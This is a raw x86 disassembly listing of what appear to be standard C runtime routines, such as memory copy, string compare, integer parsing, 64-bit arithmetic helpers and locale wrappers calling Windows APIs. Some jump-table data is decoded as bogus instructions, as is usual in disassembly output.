  426a0a:	ret    
  426a0b:	nop
  426a0c:	lea    esi,[ecx+esi*1-0x4]
  426a10:	lea    edi,[ecx+edi*1-0x4]
  426a14:	test   edi,0x3
  426a1a:	jne    0x426a40
  426a1c:	shr    ecx,0x2
  426a1f:	and    edx,0x3
  426a22:	cmp    ecx,0x8
  426a25:	jb     0x426a34
  426a27:	std    
  426a28:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2a:	cld    
  426a2b:	jmp    DWORD PTR [edx*4+0x426b58]
  426a32:	mov    edi,edi
  426a34:	neg    ecx
  426a36:	jmp    DWORD PTR [ecx*4+0x426b08]
  426a3d:	lea    ecx,[ecx+0x0]
  426a40:	mov    eax,edi
  426a42:	mov    edx,0x3
  426a47:	cmp    ecx,0x4
  426a4a:	jb     0x426a58
  426a4c:	and    eax,0x3
  426a4f:	sub    ecx,eax
  426a51:	jmp    DWORD PTR [eax*4+0x426a5c]
  426a58:	jmp    DWORD PTR [ecx*4+0x426b58]
  426a5f:	nop
  426a60:	ins    BYTE PTR es:[edi],dx
  426a61:	push   0x42
  426a63:	add    BYTE PTR [eax-0x47ffbd96],dl
  426a69:	push   0x42
  426a6b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a71:	mov    BYTE PTR [edi+0x3],al
  426a74:	sub    esi,0x1
  426a77:	shr    ecx,0x2
  426a7a:	sub    edi,0x1
  426a7d:	cmp    ecx,0x8
  426a80:	jb     0x426a34
  426a82:	std    
  426a83:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a85:	cld    
  426a86:	jmp    DWORD PTR [edx*4+0x426b58]
  426a8d:	lea    ecx,[ecx+0x0]
  426a90:	mov    al,BYTE PTR [esi+0x3]
  426a93:	and    edx,ecx
  426a95:	mov    BYTE PTR [edi+0x3],al
  426a98:	mov    al,BYTE PTR [esi+0x2]
  426a9b:	shr    ecx,0x2
  426a9e:	mov    BYTE PTR [edi+0x2],al
  426aa1:	sub    esi,0x2
  426aa4:	sub    edi,0x2
  426aa7:	cmp    ecx,0x8
  426aaa:	jb     0x426a34
  426aac:	std    
  426aad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aaf:	cld    
  426ab0:	jmp    DWORD PTR [edx*4+0x426b58]
  426ab7:	nop
  426ab8:	mov    al,BYTE PTR [esi+0x3]
  426abb:	and    edx,ecx
  426abd:	mov    BYTE PTR [edi+0x3],al
  426ac0:	mov    al,BYTE PTR [esi+0x2]
  426ac3:	mov    BYTE PTR [edi+0x2],al
  426ac6:	mov    al,BYTE PTR [esi+0x1]
  426ac9:	shr    ecx,0x2
  426acc:	mov    BYTE PTR [edi+0x1],al
  426acf:	sub    esi,0x3
  426ad2:	sub    edi,0x3
  426ad5:	cmp    ecx,0x8
  426ad8:	jb     0x426a34
  426ade:	std    
  426adf:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ae1:	cld    
  426ae2:	jmp    DWORD PTR [edx*4+0x426b58]
  426ae9:	lea    ecx,[ecx+0x0]
  426aec:	or     al,0x6b
  426aee:	inc    edx
  426aef:	add    BYTE PTR [ebx+ebp*2],dl
  426af2:	inc    edx
  426af3:	add    BYTE PTR [ebx+ebp*2],bl
  426af6:	inc    edx
  426af7:	add    BYTE PTR [ebx+ebp*2],ah
  426afa:	inc    edx
  426afb:	add    BYTE PTR [ebx+ebp*2],ch
  426afe:	inc    edx
  426aff:	add    BYTE PTR [ebx+ebp*2],dh
  426b02:	inc    edx
  426b03:	add    BYTE PTR [ebx+ebp*2],bh
  426b06:	inc    edx
  426b07:	add    BYTE PTR [edi+0x6b],cl
  426b0a:	inc    edx
  426b0b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b11:	inc    esp
  426b12:	(bad)  
  426b13:	sbb    al,0x8b
  426b15:	inc    esp
  426b16:	mov    ds,WORD PTR [eax]
  426b18:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b1c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b20:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b24:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b28:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b2c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b30:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426b34:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b40:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b44:	lea    eax,[ecx*4+0x0]
  426b4b:	add    esi,eax
  426b4d:	add    edi,eax
  426b4f:	jmp    DWORD PTR [edx*4+0x426b58]
  426b56:	mov    edi,edi
  426b58:	push   0x7000426b
  426b5d:	imul   eax,DWORD PTR [edx+0x0],0xffffff80
  426b61:	imul   eax,DWORD PTR [edx+0x0],0xffffff94
  426b65:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b69:	inc    ebp
  426b6a:	or     BYTE PTR [esi+0x5f],bl
  426b6d:	leave  
  426b6e:	ret    
  426b6f:	nop
  426b70:	mov    al,BYTE PTR [esi+0x3]
  426b73:	mov    BYTE PTR [edi+0x3],al
  426b76:	mov    eax,DWORD PTR [ebp+0x8]
  426b79:	pop    esi
  426b7a:	pop    edi
  426b7b:	leave  
  426b7c:	ret    
  426b7d:	lea    ecx,[ecx+0x0]
  426b80:	mov    al,BYTE PTR [esi+0x3]
  426b83:	mov    BYTE PTR [edi+0x3],al
  426b86:	mov    al,BYTE PTR [esi+0x2]
  426b89:	mov    BYTE PTR [edi+0x2],al
  426b8c:	mov    eax,DWORD PTR [ebp+0x8]
  426b8f:	pop    esi
  426b90:	pop    edi
  426b91:	leave  
  426b92:	ret    
  426b93:	nop
  426b94:	mov    al,BYTE PTR [esi+0x3]
  426b97:	mov    BYTE PTR [edi+0x3],al
  426b9a:	mov    al,BYTE PTR [esi+0x2]
  426b9d:	mov    BYTE PTR [edi+0x2],al
  426ba0:	mov    al,BYTE PTR [esi+0x1]
  426ba3:	mov    BYTE PTR [edi+0x1],al
  426ba6:	mov    eax,DWORD PTR [ebp+0x8]
  426ba9:	pop    esi
  426baa:	pop    edi
  426bab:	leave  
  426bac:	ret    
  426bad:	push   ebp
  426bae:	mov    ebp,esp
  426bb0:	sub    esp,0xc
  426bb3:	mov    eax,ds:0x462600
  426bb8:	xor    eax,DWORD PTR [ebp+0x4]
  426bbb:	and    BYTE PTR [ebp-0x6],0x0
  426bbf:	push   0x6
  426bc1:	mov    DWORD PTR [ebp-0x4],eax
  426bc4:	lea    eax,[ebp-0xc]
  426bc7:	push   eax
  426bc8:	push   0x1004
  426bcd:	push   DWORD PTR [ebp+0x8]
  426bd0:	call   DWORD PTR ds:0x428118
  426bd6:	test   eax,eax
  426bd8:	jne    0x426bdf
  426bda:	or     eax,0xffffffff
  426bdd:	jmp    0x426be9
  426bdf:	lea    eax,[ebp-0xc]
  426be2:	push   eax
  426be3:	call   0x426eee
  426be8:	pop    ecx
  426be9:	mov    ecx,DWORD PTR [ebp-0x4]
  426bec:	xor    ecx,DWORD PTR [ebp+0x4]
  426bef:	call   0x423ffc
  426bf4:	leave  
  426bf5:	ret    
  426bf6:	push   0x38
  426bf8:	push   0x428ef8
  426bfd:	call   0x423934
  426c02:	mov    eax,ds:0x462600
  426c07:	xor    eax,DWORD PTR [ebp+0x4]
  426c0a:	mov    DWORD PTR [ebp-0x1c],eax
  426c0d:	xor    edi,edi
  426c0f:	mov    DWORD PTR [ebp-0x20],edi
  426c12:	mov    DWORD PTR [ebp-0x24],edi
  426c15:	mov    eax,DWORD PTR [ebp+0x14]
  426c18:	mov    ebx,DWORD PTR [eax]
  426c1a:	mov    DWORD PTR [ebp-0x28],ebx
  426c1d:	mov    DWORD PTR [ebp-0x2c],edi
  426c20:	mov    eax,DWORD PTR [ebp+0x8]
  426c23:	cmp    eax,DWORD PTR [ebp+0xc]
  426c26:	je     0x426d9f
  426c2c:	lea    ecx,[ebp-0x40]
  426c2f:	push   ecx
  426c30:	push   eax
  426c31:	mov    esi,DWORD PTR ds:0x4280dc
  426c37:	call   esi
  426c39:	test   eax,eax
  426c3b:	je     0x426c5d
  426c3d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c41:	jne    0x426c5d
  426c43:	lea    eax,[ebp-0x40]
  426c46:	push   eax
  426c47:	push   DWORD PTR [ebp+0xc]
  426c4a:	call   esi
  426c4c:	test   eax,eax
  426c4e:	je     0x426c5d
  426c50:	cmp    DWORD PTR [ebp-0x40],0x1
  426c54:	jne    0x426c5d
  426c56:	mov    DWORD PTR [ebp-0x2c],0x1
  426c5d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c60:	je     0x426c7c
  426c62:	cmp    ebx,0xffffffff
  426c65:	je     0x426c6b
  426c67:	mov    esi,ebx
  426c69:	jmp    0x426c77
  426c6b:	push   DWORD PTR [ebp+0x10]
  426c6e:	call   0x423f40
  426c73:	pop    ecx
  426c74:	mov    esi,eax
  426c76:	inc    esi
  426c77:	mov    DWORD PTR [ebp-0x44],esi
  426c7a:	jmp    0x426c7f
  426c7c:	mov    esi,DWORD PTR [ebp-0x44]
  426c7f:	cmp    DWORD PTR [ebp-0x2c],edi
  426c82:	jne    0x426c9e
  426c84:	push   edi
  426c85:	push   edi
  426c86:	push   ebx
  426c87:	push   DWORD PTR [ebp+0x10]
  426c8a:	push   0x1
  426c8c:	push   DWORD PTR [ebp+0x8]
  426c8f:	call   DWORD PTR ds:0x428108
  426c95:	mov    esi,eax
  426c97:	mov    DWORD PTR [ebp-0x44],esi
  426c9a:	cmp    esi,edi
  426c9c:	je     0x426cf6
  426c9e:	mov    DWORD PTR [ebp-0x4],edi
  426ca1:	lea    eax,[esi+esi*1]
  426ca4:	add    eax,0x3
  426ca7:	and    eax,0xfffffffc
  426caa:	call   0x423980
  426caf:	mov    DWORD PTR [ebp-0x18],esp
  426cb2:	mov    ebx,esp
  426cb4:	mov    DWORD PTR [ebp-0x48],ebx
  426cb7:	lea    eax,[esi+esi*1]
  426cba:	push   eax
  426cbb:	push   edi
  426cbc:	push   ebx
  426cbd:	call   0x426230
  426cc2:	add    esp,0xc
  426cc5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cc9:	jmp    0x426ce2
  426ccb:	xor    eax,eax
  426ccd:	inc    eax
  426cce:	ret    
  426ccf:	mov    esp,DWORD PTR [ebp-0x18]
  426cd2:	call   0x426dc5
  426cd7:	xor    edi,edi
  426cd9:	xor    ebx,ebx
  426cdb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cdf:	mov    esi,DWORD PTR [ebp-0x44]
  426ce2:	cmp    ebx,edi
  426ce4:	jne    0x426d04
  426ce6:	push   esi
  426ce7:	push   0x2
  426ce9:	call   0x424a48
  426cee:	pop    ecx
  426cef:	pop    ecx
  426cf0:	mov    ebx,eax
  426cf2:	cmp    ebx,edi
  426cf4:	jne    0x426cfd
  426cf6:	xor    eax,eax
  426cf8:	jmp    0x426db1
  426cfd:	mov    DWORD PTR [ebp-0x24],0x1
  426d04:	push   esi
  426d05:	push   ebx
  426d06:	push   DWORD PTR [ebp-0x28]
  426d09:	push   DWORD PTR [ebp+0x10]
  426d0c:	push   0x1
  426d0e:	push   DWORD PTR [ebp+0x8]
  426d11:	call   DWORD PTR ds:0x428108
  426d17:	test   eax,eax
  426d19:	je     0x426da2
  426d1f:	cmp    DWORD PTR [ebp+0x18],edi
  426d22:	je     0x426d44
  426d24:	push   edi
  426d25:	push   edi
  426d26:	push   DWORD PTR [ebp+0x1c]
  426d29:	push   DWORD PTR [ebp+0x18]
  426d2c:	push   esi
  426d2d:	push   ebx
  426d2e:	push   edi
  426d2f:	push   DWORD PTR [ebp+0xc]
  426d32:	call   DWORD PTR ds:0x428094
  426d38:	test   eax,eax
  426d3a:	je     0x426da2
  426d3c:	mov    eax,DWORD PTR [ebp+0x18]
  426d3f:	mov    DWORD PTR [ebp-0x20],eax
  426d42:	jmp    0x426da2
  426d44:	cmp    DWORD PTR [ebp-0x2c],edi
  426d47:	jne    0x426d5f
  426d49:	push   edi
  426d4a:	push   edi
  426d4b:	push   edi
  426d4c:	push   edi
  426d4d:	push   esi
  426d4e:	push   ebx
  426d4f:	push   edi
  426d50:	push   DWORD PTR [ebp+0xc]
  426d53:	call   DWORD PTR ds:0x428094
  426d59:	mov    esi,eax
  426d5b:	cmp    esi,edi
  426d5d:	je     0x426da2
  426d5f:	push   esi
  426d60:	push   0x1
  426d62:	call   0x424a48
  426d67:	pop    ecx
  426d68:	pop    ecx
  426d69:	mov    DWORD PTR [ebp-0x20],eax
  426d6c:	cmp    eax,edi
  426d6e:	je     0x426da2
  426d70:	push   edi
  426d71:	push   edi
  426d72:	push   esi
  426d73:	push   eax
  426d74:	push   esi
  426d75:	push   ebx
  426d76:	push   edi
  426d77:	push   DWORD PTR [ebp+0xc]
  426d7a:	call   DWORD PTR ds:0x428094
  426d80:	cmp    eax,edi
  426d82:	jne    0x426d92
  426d84:	push   DWORD PTR [ebp-0x20]
  426d87:	call   0x42453a
  426d8c:	pop    ecx
  426d8d:	mov    DWORD PTR [ebp-0x20],edi
  426d90:	jmp    0x426da2
  426d92:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d96:	je     0x426da2
  426d98:	mov    ecx,DWORD PTR [ebp+0x14]
  426d9b:	mov    DWORD PTR [ecx],eax
  426d9d:	jmp    0x426da2
  426d9f:	mov    ebx,DWORD PTR [ebp-0x48]
  426da2:	cmp    DWORD PTR [ebp-0x24],edi
  426da5:	je     0x426dae
  426da7:	push   ebx
  426da8:	call   0x42453a
  426dad:	pop    ecx
  426dae:	mov    eax,DWORD PTR [ebp-0x20]
  426db1:	lea    esp,[ebp-0x54]
  426db4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426db7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dba:	call   0x423ffc
  426dbf:	call   0x42396f
  426dc4:	ret    
  426dc5:	push   ebp
  426dc6:	mov    ebp,esp
  426dc8:	sub    esp,0x48
  426dcb:	push   ebx
  426dcc:	push   esi
  426dcd:	push   edi
  426dce:	push   0x4
  426dd0:	pop    eax
  426dd1:	call   0x423980
  426dd6:	mov    ebx,esp
  426dd8:	push   0x1c
  426dda:	lea    eax,[ebp-0x24]
  426ddd:	push   eax
  426dde:	push   ebx
  426ddf:	call   DWORD PTR ds:0x428044
  426de5:	test   eax,eax
  426de7:	je     0x426e5a
  426de9:	mov    edi,DWORD PTR [ebp-0x20]
  426dec:	lea    eax,[ebp-0x48]
  426def:	push   eax
  426df0:	call   DWORD PTR ds:0x428058
  426df6:	mov    eax,DWORD PTR [ebp-0x44]
  426df9:	lea    esi,[eax-0x1]
  426dfc:	not    esi
  426dfe:	and    esi,ebx
  426e00:	sub    esi,eax
  426e02:	mov    DWORD PTR [ebp-0x4],eax
  426e05:	mov    eax,ds:0x462ca4
  426e0a:	mov    ecx,eax
  426e0c:	dec    ecx
  426e0d:	neg    ecx
  426e0f:	sbb    ecx,ecx
  426e11:	and    ecx,0xffff1000
  426e17:	add    ecx,0x11000
  426e1d:	add    ecx,edi
  426e1f:	cmp    esi,ecx
  426e21:	jb     0x426e5a
  426e23:	cmp    eax,0x1
  426e26:	je     0x426e72
  426e28:	mov    ebx,edi
  426e2a:	mov    edi,0x1000
  426e2f:	push   0x1c
  426e31:	lea    eax,[ebp-0x24]
  426e34:	push   eax
  426e35:	push   ebx
  426e36:	call   DWORD PTR ds:0x428044
  426e3c:	test   eax,eax
  426e3e:	je     0x426e5a
  426e40:	add    ebx,DWORD PTR [ebp-0x18]
  426e43:	test   DWORD PTR [ebp-0x14],edi
  426e46:	je     0x426e2f
  426e48:	test   BYTE PTR [ebp-0xf],0x1
  426e4c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e4f:	je     0x426e56
  426e51:	xor    eax,eax
  426e53:	inc    eax
  426e54:	jmp    0x426e8e
  426e56:	cmp    esi,ebx
  426e58:	jae    0x426e5e
  426e5a:	xor    eax,eax
  426e5c:	jmp    0x426e8e
  426e5e:	push   0x4
  426e60:	push   edi
  426e61:	push   DWORD PTR [ebp-0x4]
  426e64:	push   ebx
  426e65:	call   DWORD PTR ds:0x4280e8
  426e6b:	mov    eax,ds:0x462ca4
  426e70:	jmp    0x426e74
  426e72:	mov    ebx,esi
  426e74:	dec    eax
  426e75:	neg    eax
  426e77:	sbb    eax,eax
  426e79:	and    eax,0x103
  426e7e:	lea    ecx,[ebp-0x8]
  426e81:	push   ecx
  426e82:	inc    eax
  426e83:	push   eax
  426e84:	push   DWORD PTR [ebp-0x4]
  426e87:	push   ebx
  426e88:	call   DWORD PTR ds:0x42805c
  426e8e:	lea    esp,[ebp-0x54]
  426e91:	pop    edi
  426e92:	pop    esi
  426e93:	pop    ebx
  426e94:	leave  
  426e95:	ret    
  426e96:	int3   
  426e97:	int3   
  426e98:	int3   
  426e99:	int3   
  426e9a:	int3   
  426e9b:	int3   
  426e9c:	int3   
  426e9d:	int3   
  426e9e:	int3   
  426e9f:	int3   
  426ea0:	push   ebp
  426ea1:	mov    ebp,esp
  426ea3:	push   edi
  426ea4:	push   esi
  426ea5:	push   ebx
  426ea6:	mov    esi,DWORD PTR [ebp+0xc]
  426ea9:	mov    edi,DWORD PTR [ebp+0x8]
  426eac:	mov    al,0xff
  426eae:	mov    edi,edi
  426eb0:	or     al,al
  426eb2:	je     0x426ee6
  426eb4:	mov    al,BYTE PTR [esi]
  426eb6:	add    esi,0x1
  426eb9:	mov    ah,BYTE PTR [edi]
  426ebb:	add    edi,0x1
  426ebe:	cmp    ah,al
  426ec0:	je     0x426eb0
  426ec2:	sub    al,0x41
  426ec4:	cmp    al,0x1a
  426ec6:	sbb    cl,cl
  426ec8:	and    cl,0x20
  426ecb:	add    al,cl
  426ecd:	add    al,0x41
  426ecf:	xchg   al,ah
  426ed1:	sub    al,0x41
  426ed3:	cmp    al,0x1a
  426ed5:	sbb    cl,cl
  426ed7:	and    cl,0x20
  426eda:	add    al,cl
  426edc:	add    al,0x41
  426ede:	cmp    al,ah
  426ee0:	je     0x426eb0
  426ee2:	sbb    al,al
  426ee4:	sbb    al,0xff
  426ee6:	movsx  eax,al
  426ee9:	pop    ebx
  426eea:	pop    esi
  426eeb:	pop    edi
  426eec:	leave  
  426eed:	ret    
  426eee:	push   esi
  426eef:	push   edi
  426ef0:	call   0x4237e9
  426ef5:	mov    edi,DWORD PTR [eax+0x64]
  426ef8:	cmp    edi,DWORD PTR ds:0x46275c
  426efe:	je     0x426f07
  426f00:	call   0x424c8f
  426f05:	mov    edi,eax
  426f07:	mov    esi,DWORD PTR [esp+0xc]
  426f0b:	cmp    DWORD PTR [edi+0x28],0x1
  426f0f:	movzx  eax,BYTE PTR [esi]
  426f12:	jle    0x426f22
  426f14:	push   0x8
  426f16:	push   eax
  426f17:	push   edi
  426f18:	call   0x426f76
  426f1d:	add    esp,0xc
  426f20:	jmp    0x426f2c
  426f22:	mov    ecx,DWORD PTR [edi+0x48]
  426f25:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f29:	and    eax,0x8
  426f2c:	test   eax,eax
  426f2e:	je     0x426f33
  426f30:	inc    esi
  426f31:	jmp    0x426f0b
  426f33:	movzx  ecx,BYTE PTR [esi]
  426f36:	inc    esi
  426f37:	cmp    ecx,0x2d
  426f3a:	mov    edx,ecx
  426f3c:	je     0x426f43
  426f3e:	cmp    ecx,0x2b
  426f41:	jne    0x426f47
  426f43:	movzx  ecx,BYTE PTR [esi]
  426f46:	inc    esi
  426f47:	xor    eax,eax
  426f49:	cmp    ecx,0x30
  426f4c:	jl     0x426f58
  426f4e:	cmp    ecx,0x39
  426f51:	jg     0x426f58
  426f53:	sub    ecx,0x30
  426f56:	jmp    0x426f5b
  426f58:	or     ecx,0xffffffff
  426f5b:	cmp    ecx,0xffffffff
  426f5e:	je     0x426f6c
  426f60:	lea    eax,[eax+eax*4]
  426f63:	lea    eax,[ecx+eax*2]
  426f66:	movzx  ecx,BYTE PTR [esi]
  426f69:	inc    esi
  426f6a:	jmp    0x426f49
  426f6c:	cmp    edx,0x2d
  426f6f:	pop    edi
  426f70:	pop    esi
  426f71:	jne    0x426f75
  426f73:	neg    eax
  426f75:	ret    
  426f76:	push   ebp
  426f77:	mov    ebp,esp
  426f79:	push   ecx
  426f7a:	mov    eax,DWORD PTR [ebp+0xc]
  426f7d:	lea    ecx,[eax+0x1]
  426f80:	cmp    ecx,0x100
  426f86:	mov    ecx,DWORD PTR [ebp+0x8]
  426f89:	ja     0x426f94
  426f8b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f8e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f92:	jmp    0x426fe8
  426f94:	push   esi
  426f95:	mov    edx,eax
  426f97:	sar    edx,0x8
  426f9a:	push   edi
  426f9b:	mov    edi,DWORD PTR [ecx+0x48]
  426f9e:	movzx  esi,dl
  426fa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fa6:	pop    edi
  426fa7:	pop    esi
  426fa8:	je     0x426fb9
  426faa:	and    BYTE PTR [ebp-0x2],0x0
  426fae:	push   0x2
  426fb0:	mov    BYTE PTR [ebp-0x3],al
  426fb3:	mov    BYTE PTR [ebp-0x4],dl
  426fb6:	pop    eax
  426fb7:	jmp    0x426fc3
  426fb9:	and    BYTE PTR [ebp-0x3],0x0
  426fbd:	mov    BYTE PTR [ebp-0x4],al
  426fc0:	xor    eax,eax
  426fc2:	inc    eax
  426fc3:	push   0x1
  426fc5:	push   DWORD PTR [ecx+0x14]
  426fc8:	push   DWORD PTR [ecx+0x4]
  426fcb:	lea    ecx,[ebp+0xe]
  426fce:	push   ecx
  426fcf:	push   eax
  426fd0:	lea    eax,[ebp-0x4]
  426fd3:	push   eax
  426fd4:	push   0x1
  426fd6:	call   0x426058
  426fdb:	add    esp,0x1c
  426fde:	test   eax,eax
  426fe0:	jne    0x426fe4
  426fe2:	leave  
  426fe3:	ret    
  426fe4:	movzx  eax,WORD PTR [ebp+0xe]
  426fe8:	and    eax,DWORD PTR [ebp+0x10]
  426feb:	leave  
  426fec:	ret    
  426fed:	int3   
  426fee:	int3   
  426fef:	int3   
  426ff0:	mov    eax,DWORD PTR [esp+0x8]
  426ff4:	mov    ecx,DWORD PTR [esp+0x10]
  426ff8:	or     ecx,eax
  426ffa:	mov    ecx,DWORD PTR [esp+0xc]
  426ffe:	jne    0x427009
  427000:	mov    eax,DWORD PTR [esp+0x4]
  427004:	mul    ecx
  427006:	ret    0x10
  427009:	push   ebx
  42700a:	mul    ecx
  42700c:	mov    ebx,eax
  42700e:	mov    eax,DWORD PTR [esp+0x8]
  427012:	mul    DWORD PTR [esp+0x14]
  427016:	add    ebx,eax
  427018:	mov    eax,DWORD PTR [esp+0x8]
  42701c:	mul    ecx
  42701e:	add    edx,ebx
  427020:	pop    ebx
  427021:	ret    0x10
  427024:	int3   
  427025:	int3   
  427026:	int3   
  427027:	int3   
  427028:	int3   
  427029:	int3   
  42702a:	int3   
  42702b:	int3   
  42702c:	int3   
  42702d:	int3   
  42702e:	int3   
  42702f:	int3   
  427030:	push   ebp
  427031:	mov    ebp,esp
  427033:	push   edi
  427034:	push   esi
  427035:	push   ebx
  427036:	mov    ecx,DWORD PTR [ebp+0x10]
  427039:	or     ecx,ecx
  42703b:	je     0x42708a
  42703d:	mov    esi,DWORD PTR [ebp+0x8]
  427040:	mov    edi,DWORD PTR [ebp+0xc]
  427043:	mov    bh,0x41
  427045:	mov    bl,0x5a
  427047:	mov    dh,0x20
  427049:	lea    ecx,[ecx+0x0]
  42704c:	mov    ah,BYTE PTR [esi]
  42704e:	or     ah,ah
  427050:	mov    al,BYTE PTR [edi]
  427052:	je     0x42707b
  427054:	or     al,al
  427056:	je     0x42707b
  427058:	add    esi,0x1
  42705b:	add    edi,0x1
  42705e:	cmp    ah,bh
  427060:	jb     0x427068
  427062:	cmp    ah,bl
  427064:	ja     0x427068
  427066:	add    ah,dh
  427068:	cmp    al,bh
  42706a:	jb     0x427072
  42706c:	cmp    al,bl
  42706e:	ja     0x427072
  427070:	add    al,dh
  427072:	cmp    ah,al
  427074:	jne    0x427081
  427076:	sub    ecx,0x1
  427079:	jne    0x42704c
  42707b:	xor    ecx,ecx
  42707d:	cmp    ah,al
  42707f:	je     0x42708a
  427081:	mov    ecx,0xffffffff
  427086:	jb     0x42708a
  427088:	neg    ecx
  42708a:	mov    eax,ecx
  42708c:	pop    ebx
  42708d:	pop    esi
  42708e:	pop    edi
  42708f:	leave  
  427090:	ret    
  427091:	int3   
  427092:	int3   
  427093:	int3   
  427094:	int3   
  427095:	int3   
  427096:	int3   
  427097:	int3   
  427098:	int3   
  427099:	int3   
  42709a:	int3   
  42709b:	int3   
  42709c:	int3   
  42709d:	int3   
  42709e:	int3   
  42709f:	int3   
  4270a0:	push   esi
  4270a1:	mov    eax,DWORD PTR [esp+0x14]
  4270a5:	or     eax,eax
  4270a7:	jne    0x4270d1
  4270a9:	mov    ecx,DWORD PTR [esp+0x10]
  4270ad:	mov    eax,DWORD PTR [esp+0xc]
  4270b1:	xor    edx,edx
  4270b3:	div    ecx
  4270b5:	mov    ebx,eax
  4270b7:	mov    eax,DWORD PTR [esp+0x8]
  4270bb:	div    ecx
  4270bd:	mov    esi,eax
  4270bf:	mov    eax,ebx
  4270c1:	mul    DWORD PTR [esp+0x10]
  4270c5:	mov    ecx,eax
  4270c7:	mov    eax,esi
  4270c9:	mul    DWORD PTR [esp+0x10]
  4270cd:	add    edx,ecx
  4270cf:	jmp    0x427118
  4270d1:	mov    ecx,eax
  4270d3:	mov    ebx,DWORD PTR [esp+0x10]
  4270d7:	mov    edx,DWORD PTR [esp+0xc]
  4270db:	mov    eax,DWORD PTR [esp+0x8]
  4270df:	shr    ecx,1
  4270e1:	rcr    ebx,1
  4270e3:	shr    edx,1
  4270e5:	rcr    eax,1
  4270e7:	or     ecx,ecx
  4270e9:	jne    0x4270df
  4270eb:	div    ebx
  4270ed:	mov    esi,eax
  4270ef:	mul    DWORD PTR [esp+0x14]
  4270f3:	mov    ecx,eax
  4270f5:	mov    eax,DWORD PTR [esp+0x10]
  4270f9:	mul    esi
  4270fb:	add    edx,ecx
  4270fd:	jb     0x42710d
  4270ff:	cmp    edx,DWORD PTR [esp+0xc]
  427103:	ja     0x42710d
  427105:	jb     0x427116
  427107:	cmp    eax,DWORD PTR [esp+0x8]
  42710b:	jbe    0x427116
  42710d:	dec    esi
  42710e:	sub    eax,DWORD PTR [esp+0x10]
  427112:	sbb    edx,DWORD PTR [esp+0x14]
  427116:	xor    ebx,ebx
  427118:	sub    eax,DWORD PTR [esp+0x8]
  42711c:	sbb    edx,DWORD PTR [esp+0xc]
  427120:	neg    edx
  427122:	neg    eax
  427124:	sbb    edx,0x0
  427127:	mov    ecx,edx
  427129:	mov    edx,ebx
  42712b:	mov    ebx,ecx
  42712d:	mov    ecx,eax
  42712f:	mov    eax,esi
  427131:	pop    esi
  427132:	ret    0x10
  427135:	int3   
  427136:	int3   
  427137:	int3   
  427138:	int3   
  427139:	int3   
  42713a:	int3   
  42713b:	int3   
  42713c:	int3   
  42713d:	int3   
  42713e:	int3   
  42713f:	int3   
  427140:	lea    eax,[edx-0x1]
  427143:	pop    ebx
  427144:	ret    
  427145:	lea    esp,[esp+0x0]
  42714c:	lea    esp,[esp+0x0]
  427150:	xor    eax,eax
  427152:	mov    al,BYTE PTR [esp+0x8]
  427156:	push   ebx
  427157:	mov    ebx,eax
  427159:	shl    eax,0x8
  42715c:	mov    edx,DWORD PTR [esp+0x8]
  427160:	test   edx,0x3
  427166:	je     0x42717d
  427168:	mov    cl,BYTE PTR [edx]
  42716a:	add    edx,0x1
  42716d:	cmp    cl,bl
  42716f:	je     0x427140
  427171:	test   cl,cl
  427173:	je     0x4271c6
  427175:	test   edx,0x3
  42717b:	jne    0x427168
  42717d:	or     ebx,eax
  42717f:	push   edi
  427180:	mov    eax,ebx
  427182:	shl    ebx,0x10
  427185:	push   esi
  427186:	or     ebx,eax
  427188:	mov    ecx,DWORD PTR [edx]
  42718a:	mov    edi,0x7efefeff
  42718f:	mov    eax,ecx
  427191:	mov    esi,edi
  427193:	xor    ecx,ebx
  427195:	add    esi,eax
  427197:	add    edi,ecx
  427199:	xor    ecx,0xffffffff
  42719c:	xor    eax,0xffffffff
  42719f:	xor    ecx,edi
  4271a1:	xor    eax,esi
  4271a3:	add    edx,0x4
  4271a6:	and    ecx,0x81010100
  4271ac:	jne    0x4271ca
  4271ae:	and    eax,0x81010100
  4271b3:	je     0x427188
  4271b5:	and    eax,0x1010100
  4271ba:	jne    0x4271c4
  4271bc:	and    esi,0x80000000
  4271c2:	jne    0x427188
  4271c4:	pop    esi
  4271c5:	pop    edi
  4271c6:	pop    ebx
  4271c7:	xor    eax,eax
  4271c9:	ret    
  4271ca:	mov    eax,DWORD PTR [edx-0x4]
  4271cd:	cmp    al,bl
  4271cf:	je     0x427207
  4271d1:	test   al,al
  4271d3:	je     0x4271c4
  4271d5:	cmp    ah,bl
  4271d7:	je     0x427200
  4271d9:	test   ah,ah
  4271db:	je     0x4271c4
  4271dd:	shr    eax,0x10
  4271e0:	cmp    al,bl
  4271e2:	je     0x4271f9
  4271e4:	test   al,al
  4271e6:	je     0x4271c4
  4271e8:	cmp    ah,bl
  4271ea:	je     0x4271f2
  4271ec:	test   ah,ah
  4271ee:	je     0x4271c4
  4271f0:	jmp    0x427188
  4271f2:	pop    esi
  4271f3:	pop    edi
  4271f4:	lea    eax,[edx-0x1]
  4271f7:	pop    ebx
